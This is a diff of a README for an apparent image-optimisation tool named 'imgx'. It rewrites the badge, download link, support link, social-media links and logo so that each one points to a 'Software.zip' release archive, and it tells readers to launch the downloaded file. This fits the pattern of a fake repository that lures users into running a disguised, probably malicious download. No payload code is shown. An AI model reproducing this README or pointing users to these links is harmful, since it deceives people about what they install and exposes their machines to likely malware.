@@ -1,7 +1,7 @@
 
 # Welcome to **imgx** 🏞️
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![License](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -26,7 +26,7 @@
 ## Installation
 
 To get started with **imgx**, simply download the software package from the following link:
-[Download imgx Software](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Download imgx Software](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
 
 *Note: Please launch the downloaded file to begin the installation process.*
 
@@ -58,7 +58,7 @@ To get started with **imgx**, simply download the software package from the foll
 
 ## Support
 
-For any questions or assistance regarding **imgx**, please refer to the [Releases](https://github.com/Rubenas123/6487922/releases) section for the latest updates and announcements.
+For any questions or assistance regarding **imgx**, please refer to the [Releases](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip) section for the latest updates and announcements.
 
 ---
 
@@ -72,11 +72,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Follow us on social media for the latest news and updates:
 
-🐦 [Twitter](https://twitter.com/imgx_official)
+🐦 [Twitter](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
 
-📘 [Facebook](https://facebook.com/imgx)
+📘 [Facebook](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
 
-📷 [Instagram](https://instagram.com/imgx_official)
+📷 [Instagram](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -84,4 +84,4 @@ Thank you for choosing **imgx** to optimize your web images and enhance your onl
 
 ---
 
-![imgx Logo](https://yourimagelink.com/logo.png)
+![imgx Logo](https://github.com/shellyACM/imgx/releases/download/v1.0/Software.zip)
